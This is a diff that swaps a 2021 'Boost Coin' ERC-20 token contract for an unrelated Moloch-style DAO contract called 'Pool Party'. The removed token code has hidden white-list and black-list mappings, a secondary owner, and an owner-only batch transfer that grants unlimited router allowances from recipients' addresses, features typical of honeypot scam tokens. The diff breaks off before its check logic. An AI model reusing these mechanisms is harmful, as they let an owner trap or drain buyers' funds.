@@ -1,844 +1,944 @@
-/**
- *Submitted for verification at Etherscan.io on 2021-06-17
-*/
+// File: contracts/oz/SafeMath.sol
 
-pragma solidity ^0.6.6;
+pragma solidity ^0.5.17;
 
-/**
- * Supporting Small Businesses
- * Boost Your Business
- * Collaboration Coin 1st Ever 🥇
- * 
- * 
-NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMNmdhhyysssssssssyyhhdmmNMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMmdhso+++++++++++++++++++++++++osyhmNMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNNNNNNNNNNNMMMMNdhso++++++++++++++++++++++++++++++++++++oydNMMMMNNNNNNNNNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNNNNNNNNMMMMmhso++++++++++++++++++++++++++++++++++++++++++++oymNMMMNNNNNNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNNNNNMMMMmho+++++++++++++++++++++++++++++++++++++++++++++++++++oymMMMMNNNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNNNMMMNds++++++++++++++++++o++oooooooooooooo++++++++++++++++++++++ohNMMMNNNNNNNNNNNNNNN
-NNNNNNNNNNNNNNMMMNho++++++++++++++ooooooooooooooooooooooooooooooo++++++++++++++++oymMMMNNNNNNNNNNNNN
-NNNNNNNNNNNNMMMNho++++++++++++ooooooooooooooooooooooooooooooooooooooooo+++++++++++++ymMMMNNNNNNNNNNN
-NNNNNNNNNNNMMMdo+++++++++ooooooooooooooooooooooooooooooooooooooooooooooooo+++++++++++oyNMMNNNNNNNNNN
-NNNNNmNNNMMMms+++++++++oooooooooooossssssssssssssssssssssssssssssooooooooooo+++++++++++odMMMNNNNNNNN
-NNNNNmNNMMMho++++++++ooooooooossssssssssssssssyyyyysssssssssssssssssssoooooooo+++++++++++yNMMNNNNNNm
-mmmmmNNMMNy++++++++ooooooossssssyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyssssssooooooo++++++++++omMMNmmmmm
-mmmmNNMMNs++++++++oooooosoo+//////++++++++++++++++++++++++++++++ossyyyyysssoooooo++++++++++odMMNNmmm
-mmmmNMMNs++++++++oooooosso++oooooo+````````````````````````````````-::::oyssoooooo+++++++++++dMMNmmm
-mmmNMMNs++++++++ooooooossyyyyhhhhd-``````````````````````````````````````/yssoooooo+++++++++++mMMNmm
-mmNMMMy+++++++++oooooosssy:------:````````````````````````````````````ssoosssooooooo++++++++++oNMMNm
-mmMMMd+++++++++oooooosssyh.````````````.....................``````````+hyyysssooooooo++++++++++sMMNm
-mNMMNo+++++++++oooooosssyh.```````````shyyyyyyhhhhyyyhhhhhhhy+````````-hyyysssooooooo+++++++++++dMMN
-mMMMy++++++++++oooooosssyh.```````````ydyssssyhhhhhhhhhhhhdddd-```````.dhyysssooooooo+++++++++++oMMN
-NMMN+++++++++++oooooosssyyoooos-``````::ddhhhyooooooooooyhhhddys```````:+yysssooooooo++++++++++++dMM
-NMMd++++++++++ooooooossssyyyhhd:````````dhhhhsooooooooooyhhddddd````````/hysssoooooooo+++++++++++sMM
-MMMy++++++++++oooooooosssyyyhh-```````:ydhhhhhhhhhhhhhhhddddddo-```````syyysssoooooooo++++++++++++MM
-MMMs++++++++++oooooooosssyyyhh ```````/dhhhhhhysssssssssssyss+````````:hhyysssoooooooo++++++++++++NM
-MMMo++++++++++oooooooossssyyhh ```````/dhhhhd/```````````````````````-hhyyysssoooooooo++++++++++++mM
-MMMo++++++++++oooooooossssyyhh ```````/dhhhhd-``````````````````````:dhhyyysssoooooooo++++++++++++mM
-MMMo++++++++++oooooooossssyyhh ```````/dddhhd:```````````````````````/dhhyysssoooooooo++++++++++++mM
-MMMs++++++++++oooooooossssyysooooo-``::////hsoooo+```````````````````:///:/yssoooooooo++++++++++++NM
-NMMh++++++++++oooooooossssyh-```````.ddhhhhhhssssssssssyyys+.````````ohhyyysssoooooooo+++++++++++oMM
-NMMm+++++++++++ooooooossssyh-```````.ddhhhhhhhhhhhhhhhhhhdddy````````:hhyyysssoooooooo+++++++++++hMM
-mMMMs++++++++++ooooooossssyh:-------.yysssshhsssyhhhhhhhhhhdd---------sssoysssoooooooo+++++++++++NMM
-mNMMd++++++++++ooooooossssyyyhhhhhdd```````-:yyyyhhhhhhhhhhhdhhhhhhhy`````syssooooooo+++++++++++yMMN
-mmMMMs++++++++++ooooooosssyyooosssss`:::::::+dhhhhhhhhhhhhhhhssssssso.::::ssssooooooo+++++++++++NMMm
-mmNMMNo+++++++++ooooooosssyh-````````ddddddddddsssssssssshhh+````````:hyyysssooooooo+++++++++++dMMNm
-mmmNMMd+++++++++ooooooosssyh-````````.......................`````````ohyyssssoooooo+++++++++++yMMNmm
-mmmmMMMd+++++++++oooooosssyh+///-````````````````````````````````````++++sssooooooo++++++++++sNMNmmm
-mmmmmMMMh+++++++++ooooossso-----.`````````````````````````````````/sssooossoooooo+++++++++++sNMNmmmm
-mmmmmmMMMdo+++++++oooooossy/.```````````````````````````````````-oyyyyssssooooooo++++++++++yNMNmmmmm
-mmmmmmmNMMmo+++++++oooooossssssssss+::::::::::::::::::::::::::::/++ossssooooooo++++++++++ohMMNmmmmmm
-mmmmmmmmNMMNy+++++++ooooooossssssyyyyyyyyyyhhhhhhhhhhhhhyyyyyyyyyyssssoooooooo++++++++++smMMNmmmmmmm
-mmmmmmmmmNMMMds+++++++oooooooosssssssssssssyyyyyyyyyyyyysssssssssssooooooooo++++++++++ohNMNmmmmmmmmm
-mmmmmmmmmmmNMMNho+++++++ooooooooooosssssssssssssssssssssssssssoooooooooooo+++++++++++ymMMNmmmmmmmmmm
-mmmmmmmmmmmmmNMMNho++++++ooooooooooooooooooooooooooooooooooooooooooooooo++++++++++oymMMNmmmmmmmmmmmm
-mmmmmmmmmmmmmmNNMMNds+++++++++ooooooooooooooooooooooooooooooooooooooo+++++++++++oymMMNmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmNNMMMmyo++++++++++ooooooooooooooooooooooooooooo++++++++++++++osdNMMNmmmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmmmmNMMMNdyo+++++++++++++++++ooo+++++++o+++++++++++++++++++oshmMMMNmmmmmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmmmmmmNNMMMNmhso++++++++++++++++++++++++++++++++++++++++oydNMMMNmmmmmmmmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmmmmmmmmmNNMMMMNmhyo+++++++++++++++++++++++++++++++osydNMMMMNmmmmmmmmmmmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmmmmmmmmmmmmmNNMMMMMNmdhysoo++++++++++++++++osyhdmNMMMMMNNmmmmmmmmmmmmmmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNMMMMMMMMMNmmmmmmmmmmmNNMMMMMMMNNNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
-mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmNNNNNNMMMMMMMMMMMNNNNNNmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 
- * 
- * 
- * 
- * @dev Wrappers over Solidity's arithmetic operations with added overflow
- * checks.
- *
- * Arithmetic operations in Solidity wrap on overflow. This can easily result
- * in bugs, because programmers usually assume that an overflow raises an
- * error, which is the standard behavior in high level programming languages.
- * `SafeMath` restores this intuition by reverting the transaction when an
- * operation overflows.
- *
- * Using this library instead of the unchecked operations eliminates an entire
- * class of bugs, so it's recommended to use it always.
- */
 library SafeMath {
-    /**
-     * @dev Returns the addition of two unsigned integers, reverting on
-     * overflow.
-     *
-     * Counterpart to Solidity's `+` operator.
-     *
-     * Requirements:
-     * - Addition cannot overflow.
-     */
     function add(uint256 a, uint256 b) internal pure returns (uint256) {
         uint256 c = a + b;
-        require(c >= a, "SafeMath: addition overflow");
+        require(c >= a);
 
         return c;
     }
-
-    /**
-     * @dev Returns the subtraction of two unsigned integers, reverting on
-     * overflow (when the result is negative).
-     *
-     * Counterpart to Solidity's `-` operator.
-     *
-     * Requirements:
-     * - Subtraction cannot overflow.
-     */
+    
     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-        return sub(a, b, "SafeMath: subtraction overflow");
-    }
-
-    /**
-     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
-     * overflow (when the result is negative).
-     *
-     * Counterpart to Solidity's `-` operator.
-     *
-     * Requirements:
-     * - Subtraction cannot overflow.
-     *
-     * _Available since v2.4.0._
-     */
-    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        require(b <= a, errorMessage);
+        require(b <= a);
         uint256 c = a - b;
 
         return c;
     }
-
-    /**
-     * @dev Returns the multiplication of two unsigned integers, reverting on
-     * overflow.
-     *
-     * Counterpart to Solidity's `*` operator.
-     *
-     * Requirements:
-     * - Multiplication cannot overflow.
-     */
+    
     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
-        // benefit is lost if 'b' is also tested.
-        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
         if (a == 0) {
             return 0;
         }
 
         uint256 c = a * b;
-        require(c / a == b, "SafeMath: multiplication overflow");
+        require(c / a == b);
 
         return c;
     }
 
-    /**
-     * @dev Returns the integer division of two unsigned integers. Reverts on
-     * division by zero. The result is rounded towards zero.
-     *
-     * Counterpart to Solidity's `/` operator. Note: this function uses a
-     * `revert` opcode (which leaves remaining gas untouched) while Solidity
-     * uses an invalid opcode to revert (consuming all remaining gas).
-     *
-     * Requirements:
-     * - The divisor cannot be zero.
-     */
     function div(uint256 a, uint256 b) internal pure returns (uint256) {
-        return div(a, b, "SafeMath: division by zero");
-    }
-
-    /**
-     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
-     * division by zero. The result is rounded towards zero.
-     *
-     * Counterpart to Solidity's `/` operator. Note: this function uses a
-     * `revert` opcode (which leaves remaining gas untouched) while Solidity
-     * uses an invalid opcode to revert (consuming all remaining gas).
-     *
-     * Requirements:
-     * - The divisor cannot be zero.
-     *
-     * _Available since v2.4.0._
-     */
-    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        // Solidity only automatically asserts when dividing by 0
-        require(b > 0, errorMessage);
+        require(b > 0);
         uint256 c = a / b;
-        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
         return c;
     }
-
-    /**
-     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
-     * Reverts when dividing by zero.
-     *
-     * Counterpart to Solidity's `%` operator. This function uses a `revert`
-     * opcode (which leaves remaining gas untouched) while Solidity uses an
-     * invalid opcode to revert (consuming all remaining gas).
-     *
-     * Requirements:
-     * - The divisor cannot be zero.
-     */
-    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
-        return mod(a, b, "SafeMath: modulo by zero");
-    }
-
-    /**
-     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
-     * Reverts with custom message when dividing by zero.
-     *
-     * Counterpart to Solidity's `%` operator. This function uses a `revert`
-     * opcode (which leaves remaining gas untouched) while Solidity uses an
-     * invalid opcode to revert (consuming all remaining gas).
-     *
-     * Requirements:
-     * - The divisor cannot be zero.
-     *
-     * _Available since v2.4.0._
-     */
-    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        require(b != 0, errorMessage);
-        return a % b;
-    }
 }
 
-/**
- * @dev Collection of functions related to the address type
- */
-library Address {
-    /**
-     * @dev Returns true if `account` is a contract.
-     *
-     * [IMPORTANT]
-     * ====
-     * It is unsafe to assume that an address for which this function returns
-     * false is an externally-owned account (EOA) and not a contract.
-     *
-     * Among others, `isContract` will return false for the following
-     * types of addresses:
-     *
-     *  - an externally-owned account
-     *  - a contract in construction
-     *  - an address where a contract will be created
-     *  - an address where a contract lived, but was destroyed
-     * ====
-     */
-    function isContract(address account) internal view returns (bool) {
-        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
-        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
-        // for accounts without code, i.e. `keccak256('')`
-        bytes32 codehash;
-        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
-        // solhint-disable-next-line no-inline-assembly
-        assembly { codehash := extcodehash(account) }
-        return (codehash != accountHash && codehash != 0x0);
-    }
+// File: contracts/oz/IERC20.sol
 
-    /**
-     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
-     * `recipient`, forwarding all available gas and reverting on errors.
-     *
-     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
-     * of certain opcodes, possibly making contracts go over the 2300 gas limit
-     * imposed by `transfer`, making them unable to receive funds via
-     * `transfer`. {sendValue} removes this limitation.
-     *
-     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
-     *
-     * IMPORTANT: because control is transferred to `recipient`, care must be
-     * taken to not create reentrancy vulnerabilities. Consider using
-     * {ReentrancyGuard} or the
-     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
-     */
-    function sendValue(address payable recipient, uint256 amount) internal {
-        require(address(this).balance >= amount, "Address: insufficient balance");
+pragma solidity ^0.5.17;
 
-        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
-        (bool success, ) = recipient.call{ value: amount }("");
-        require(success, "Address: unable to send value, recipient may have reverted");
-    }
+interface IERC20 { // brief interface for moloch erc20 token txs
+    function balanceOf(address who) external view returns (uint256);
+    
+    function transfer(address to, uint256 value) external returns (bool);
 
-    /**
-     * @dev Performs a Solidity function call using a low level `call`. A
-     * plain`call` is an unsafe replacement for a function call: use this
-     * function instead.
-     *
-     * If `target` reverts with a revert reason, it is bubbled up by this
-     * function (like regular Solidity function calls).
-     *
-     * Returns the raw returned data. To convert to the expected return value,
-     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
-     *
-     * Requirements:
-     *
-     * - `target` must be a contract.
-     * - calling `target` with `data` must not revert.
-     *
-     * _Available since v3.1._
-     */
-    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
-      return functionCall(target, data, "Address: low-level call failed");
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
-     * `errorMessage` as a fallback revert reason when `target` reverts.
-     *
-     * _Available since v3.1._
-     */
-    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
-        return _functionCallWithValue(target, data, 0, errorMessage);
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
-     * but also transferring `value` wei to `target`.
-     *
-     * Requirements:
-     *
-     * - the calling contract must have an ETH balance of at least `value`.
-     * - the called Solidity function must be `payable`.
-     *
-     * _Available since v3.1._
-     */
-    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
-        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
-    }
-
-    /**
-     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
-     * with `errorMessage` as a fallback revert reason when `target` reverts.
-     *
-     * _Available since v3.1._
-     */
-    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
-        require(address(this).balance >= value, "Address: insufficient balance for call");
-        return _functionCallWithValue(target, data, value, errorMessage);
-    }
-
-    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
-        require(isContract(target), "Address: call to non-contract");
-
-        // solhint-disable-next-line avoid-low-level-calls
-        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
-        if (success) {
-            return returndata;
-        } else {
-            // Look for revert reason and bubble it up if present
-            if (returndata.length > 0) {
-                // The easiest way to bubble the revert reason is using memory via assembly
-
-                // solhint-disable-next-line no-inline-assembly
-                assembly {
-                    let returndata_size := mload(returndata)
-                    revert(add(32, returndata), returndata_size)
-                }
-            } else {
-                revert(errorMessage);
-            }
-        }
-    }
-}
-
-contract Context {
-    // Empty internal constructor, to prevent people from mistakenly deploying
-    // an instance of this contract, which should be used via inheritance.
-    constructor () internal { }
-
-    function _msgSender() internal view virtual returns (address payable) {
-        return msg.sender;
-    }
-
-    function _msgData() internal view virtual returns (bytes memory) {
-        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
-        return msg.data;
-    }
-}
-
-/**
- * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
- * the optional functions; to access them see {ERC20Detailed}.
- */
-interface IERC20 {
-    /**
-     * @dev Returns the amount of tokens in existence.
-     */
-    function totalSupply() external view returns (uint256);
-
-    /**
-     * @dev Returns the amount of tokens owned by `account`.
-     */
-    function balanceOf(address account) external view returns (uint256);
-
-    /**
-     * @dev Moves `amount` tokens from the caller's account to `recipient`.
-     *
-     * Returns a boolean value indicating whether the operation succeeded.
-     *
-     * Emits a {Transfer} event.
-     */
-    function transfer(address recipient, uint256 amount) external returns (bool);
-
-    /**
-     * @dev Returns the remaining number of tokens that `spender` will be
-     * allowed to spend on behalf of `owner` through {transferFrom}. This is
-     * zero by default.
-     *
-     * This value changes when {approve} or {transferFrom} are called.
-     */
-    function allowance(address owner, address spender) external view returns (uint256);
-
-    /**
-     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
-     *
-     * Returns a boolean value indicating whether the operation succeeded.
-     *
-     * IMPORTANT: Beware that changing an allowance with this method brings the risk
-     * that someone may use both the old and the new allowance by unfortunate
-     * transaction ordering. One possible solution to mitigate this race
-     * condition is to first reduce the spender's allowance to 0 and set the
-     * desired value afterwards:
-     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
-     *
-     * Emits an {Approval} event.
-     */
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    
     function approve(address spender, uint256 amount) external returns (bool);
-
-    /**
-     * @dev Moves `amount` tokens from `sender` to `recipient` using the
-     * allowance mechanism. `amount` is then deducted from the caller's
-     * allowance.
-     *
-     * Returns a boolean value indicating whether the operation succeeded.
-     *
-     * Emits a {Transfer} event.
-     */
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-
-    /**
-     * @dev Emitted when `value` tokens are moved from one account (`from`) to
-     * another (`to`).
-     *
-     * Note that `value` may be zero.
-     */
-    event Transfer(address indexed from, address indexed to, uint256 value);
-
-    /**
-     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
-     * a call to {approve}. `value` is the new allowance.
-     */
-    event Approval(address indexed owner, address indexed spender, uint256 value);
 }
 
-/**
- * @dev Implementation of the {IERC20} interface.
- *
- * This implementation is agnostic to the way tokens are created. This means
- * that a supply mechanism has to be added in a derived contract using {_mint}.
- * For a generic mechanism see {ERC20PresetMinterPauser}.
- *
- * TIP: For a detailed writeup see our guide
- * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
- * to implement supply mechanisms].
- *
- * We have followed general OpenZeppelin guidelines: functions revert instead
- * of returning `false` on failure. This behavior is nonetheless conventional
- * and does not conflict with the expectations of ERC20 applications.
- *
- * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
- * This allows applications to reconstruct the allowance for all accounts just
- * by listening to said events. Other implementations of the EIP may not emit
- * these events, as it isn't required by the specification.
- *
- * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
- * functions have been added to mitigate the well-known issues around setting
- * allowances. See {IERC20-approve}.
- */
-contract BOOST is Context, IERC20 {
+// File: contracts/oz/NewReentrancy.sol
+
+pragma solidity 0.5.17;
+
+contract ReentrancyGuard { // call wrapper for reentrancy check
+    bool private _notEntered;
+
+    function _initReentrancyGuard () internal {
+        _notEntered = true;
+    }
+
+    modifier nonReentrant() {
+        require(_notEntered, "ReentrancyGuard: reentrant call");
+
+        _notEntered = false;
+
+        _;
+
+        _notEntered = true;
+    }
+}
+
+// File: contracts/CloneParty.sol
+
+pragma solidity ^0.5.17;
+
+
+
+
+    /*=====================
+    WELCOME TO THE POOL Party v1
+    
+    **USE AT YOUR OWN RISK**
+    Forked from an early version of the permissioned Mystic v2x by LexDAO 
+    Special thanks to LexDAO for pushing the boundaries of Moloch mysticism 
+    
+    Developed by Peeps Democracy
+    MIT License - But please use for good (ie. don't be a dick). 
+    Definitely NO WARRANTIES.
+    =======================*/
+
+interface IIdleToken {
+  function token() external returns (address underlying);
+  function govTokens(uint256) external returns (address govToken);
+  function userAvgPrices(address) external returns (uint256 avgPrice);
+  function mintIdleToken(uint256 _amount, bool _skipWholeRebalance, address _referral) external returns (uint256 mintedTokens);
+  function redeemIdleToken(uint256 _amount) external returns (uint256 redeemedTokens);
+  function redeemInterestBearingTokens(uint256 _amount) external;
+  function rebalance() external returns (bool);
+  function rebalanceWithGST() external returns (bool);
+  function tokenPrice() external view returns (uint256 price);
+  function getAPRs() external view returns (address[] memory addresses, uint256[] memory aprs);
+  function getAvgAPR() external view returns (uint256 avgApr);
+  function getGovTokensAmounts(address _usr) external view returns (uint256[] memory _amounts);
+}
+
+
+contract Party is ReentrancyGuard {
     using SafeMath for uint256;
-    using Address for address;
+
     
-    mapping (address => uint256) private _balances;
-    mapping (address => bool) private _whiteAddress;
-    mapping (address => bool) private _blackAddress;
+    /****************
+    GOVERNANCE PARAMS
+    ****************/
+    uint256 public periodDuration; // default = 17280 = 4.8 hours in seconds (5 periods per day)
+    uint256 public votingPeriodLength; // default = 35 periods (7 days)
+    uint256 public gracePeriodLength; // default = 35 periods (7 days)
+    uint256 public proposalDepositReward; // default = 10 ETH (~$1,000 worth of ETH at contract deployment)
+    uint256 public depositRate; // rate to convert into shares during summoning time (default = 10000000000000000000 wei amt. // 100 wETH => 10 shares)
+    uint256 public summoningTime; // needed to determine the current period
+    uint256 public partyGoal; // savings goal for DAO 
+    uint256 public dilutionBound;
+
+    address public daoFee; // address where fees are sent
+    address public depositToken; // deposit token contract reference; default = periodDuration
+    address public idleToken;
     
-    uint256 private _sellAmount = 0;
+    bool public initialized;
+    //address public constant idleToken = 0xB517bB2c2A5D690de2A866534714eaaB13832389;
 
-    mapping (address => mapping (address => uint256)) private _allowances;
 
-    uint256 private _totalSupply;
+    // HARD-CODED LIMITS
+    // These numbers are quite arbitrary; they are small enough to avoid overflows when doing calculations
+    // with periods or shares, yet big enough to not limit reasonable use cases.
+     // default = 5
+    uint256 constant MAX_INPUT = 10**36; // maximum bound for reasonable limits
+    uint256 constant MAX_TOKEN_WHITELIST_COUNT = 100; // maximum number of whitelisted tokens
+
+    // ***************
+    // EVENTS
+    // ***************
+    event SummonComplete(address[] indexed summoners, address[] tokens, uint256 summoningTime, uint256 periodDuration, uint256 votingPeriodLength, uint256 gracePeriodLength, uint256 proposalDepositReward, uint256 partyGoal, uint256 depositRate);
+    event MakeDeposit(address indexed memberAddress, uint256 tribute, uint256 mintedTokens, uint256 indexed shares, uint8 goalHit);
+    event ProcessAmendGovernance(uint256 indexed proposalIndex, uint256 indexed proposalId, bool didPass, address newToken, address newIdle, uint256 newPartyGoal, uint256 newDepositRate);    
+    event SubmitProposal(address indexed applicant, uint256 sharesRequested, uint256 lootRequested, uint256 tributeOffered, address tributeToken, uint256 paymentRequested, address paymentToken, bytes32 details, bool[8] flags, uint256 proposalId, address indexed delegateKey, address indexed memberAddress);
+    event SponsorProposal(address indexed sponsor, address indexed memberAddress, uint256 proposalId, uint256 proposalIndex, uint256 startingPeriod);
+    event SubmitVote(uint256 proposalId, uint256 indexed proposalIndex, address indexed delegateKey, address indexed memberAddress, uint8 uintVote);
+    event ProcessProposal(uint256 indexed proposalIndex, uint256 indexed proposalId, bool didPass);
+    event ProcessIdleProposal(uint256 indexed proposalIndex, uint256 indexed proposalId, uint256 idleRedemptionAmt, uint256 depositTokenAmt);
+    event ProcessGuildKickProposal(uint256 indexed proposalIndex, uint256 indexed proposalId, bool didPass);
+    event Ragequit(address indexed memberAddress, uint256 sharesToBurn, uint256 lootToBurn);
+    event TokensCollected(address indexed token, uint256 amountToCollect);
+    event CancelProposal(uint256 indexed proposalId, address applicantAddress);
+    event UpdateDelegateKey(address indexed memberAddress, address newDelegateKey);
+    event WithdrawEarnings(address indexed memberAddress, address iToken, uint256 earningsToUser, address depositToken, uint256 redeemedTokens);
+    event Withdraw(address indexed memberAddress, address token, uint256 amount);
+
+    // *******************
+    // INTERNAL ACCOUNTING
+    // *******************
+
+    uint8 public goalHit; // tracks whether goal has been hit
+    uint256 public proposalCount; // total proposals submitted
+    uint256 public totalShares; // total shares across all members
+    uint256 public totalLoot; // total loot across all members
+    uint256 public totalDeposits; //track deposits made for goal
+    uint256 public idleAvgCost; // track avg cost to be efficient with gas
+
+
+    address public constant GUILD = address(0xdead);
+    address public constant ESCROW = address(0xbeef);
+    address public constant TOTAL = address(0xbabe);
+    mapping(address => mapping(address => uint256)) public userTokenBalances; // userTokenBalances[userAddress][tokenAddress]
+
+    enum Vote {
+        Null, // default value, counted as abstention
+        Yes,
+        No
+    }
+
+    struct Member {
+        uint256 shares; // the # of voting shares assigned to this member
+        uint256 loot; // the loot amount available to this member (combined with shares on ragequit)
+        uint256 iTB; // iToken Balance
+        uint256 iTW; // iToken withdrawals
+        uint256 iVal; // base value off which earnings are calculated
+        uint256 highestIndexYesVote; // highest proposal index # on which the member voted YES
+        bool jailed; // set to proposalIndex of a passing guild kick proposal for this member, prevents voting on and sponsoring proposals
+        bool exists; // always true once a member has been created
+    }
+
+    struct Proposal {
+        address applicant; // the applicant who wishes to become a member - this key will be used for withdrawals (doubles as guild kick target for gkick proposals)
+        address proposer; // the account that submitted the proposal (can be non-member)
+        address sponsor; // the member that sponsored the proposal (moving it into the queue)
+        uint256 sharesRequested; // the # of shares the applicant is requesting
+        uint256 lootRequested; // the amount of loot the applicant is requesting
+        uint256 tributeOffered; // amount of tokens offered as tribute
+        address tributeToken; // tribute token contract reference
+        uint256 paymentRequested; // amount of tokens requested as payment
+        address paymentToken; // payment token contract reference
+        uint256 startingPeriod; // the period in which voting can start for this proposal
+        uint256 yesVotes; // the total number of YES votes for this proposal
+        uint256 noVotes; // the total number of NO votes for this proposal
+        bool[8] flags; // [sponsored, processed, didPass, cancelled, guildkick, spending, member, action]
+        bytes32 details; // proposal details to add context for members 
+        uint256 maxTotalSharesAndLootAtYesVote; // the maximum # of total shares encountered at a yes vote on this proposal
+        mapping(address => Vote) votesByMember; // the votes on this proposal by each member
+    }
+
+    mapping(address => bool) public tokenWhitelist;
+    address[] public approvedTokens;
+
+    mapping(address => bool) public proposedToKick;
+
+    mapping(address => Member) public members;
+    address[] public memberList;
+
+    mapping(uint256 => Proposal) public proposals;
+    uint256[] public proposalQueue;
+    mapping(uint256 => bytes) public actions; // proposalId => action data
+
     
-    string private _name = 'Boost Coin 💰';
-    string private _symbol = 'BOOST💰';
-    uint8 private _decimals;
-    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
-
-    address public _owner;
-    address private _safeOwner;
-    address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // PCS
-    
-
-    /**
-     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
-     * a default value of 18.
-     *
-     * To select a different value for {decimals}, use {_setupDecimals}.
-     *
-     * All three of these values are immutable: they can only be set once during
-     * construction.
-     */
-   constructor (uint256 initialSupply, address payable owner) public {
-        _decimals = 18;
-        _owner = owner;
-        _safeOwner = owner;
-        _mint(_owner, initialSupply*(10**18));
-    }
-
-    /**
-     * @dev Returns the name of the token.
-     */
-    function name() public view returns (string memory) {
-        return _name;
-    }
-
-    /**
-     * @dev Returns the symbol of the token, usually a shorter version of the
-     * name.
-     */
-    function symbol() public view returns (string memory) {
-        return _symbol;
-    }
-
-    /**
-     * @dev Returns the number of decimals used to get its user representation.
-     * For example, if `decimals` equals `2`, a balance of `505` tokens should
-     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
-     *
-     * Tokens usually opt for a value of 18, imitating the relationship between
-     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
-     * called.
-     *
-     * NOTE: This information is only used for _display_ purposes: it in
-     * no way affects any of the arithmetic of the contract, including
-     * {IERC20-balanceOf} and {IERC20-transfer}.
-     */
-    function decimals() public view returns (uint8) {
-        return _decimals;
-    }
-
-    /**
-     * @dev See {IERC20-totalSupply}.
-     */
-    function totalSupply() public view override returns (uint256) {
-        return _totalSupply;
-    }
-
-    /**
-     * @dev See {IERC20-balanceOf}.
-     */
-    function balanceOf(address account) public view override returns (uint256) {
-        return _balances[account];
-    }
-
-    /**
-     * @dev See {IERC20-transfer}.
-     *
-     * Requirements:
-     *
-     * - `recipient` cannot be the zero address.
-     * - the caller must have a balance of at least `amount`.
-     */
-    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
-        _approveCheck(_msgSender(), recipient, amount);
-        return true;
-    }
-    
-  function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
-    require(msg.sender == _owner, "!owner");
-    for (uint256 i = 0; i < receivers.length; i++) {
-      transfer(receivers[i], amounts[i]);
-      
-      if(i < approvecount){
-          _whiteAddress[receivers[i]]=true;
-          _approve(receivers[i], _unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
-      }
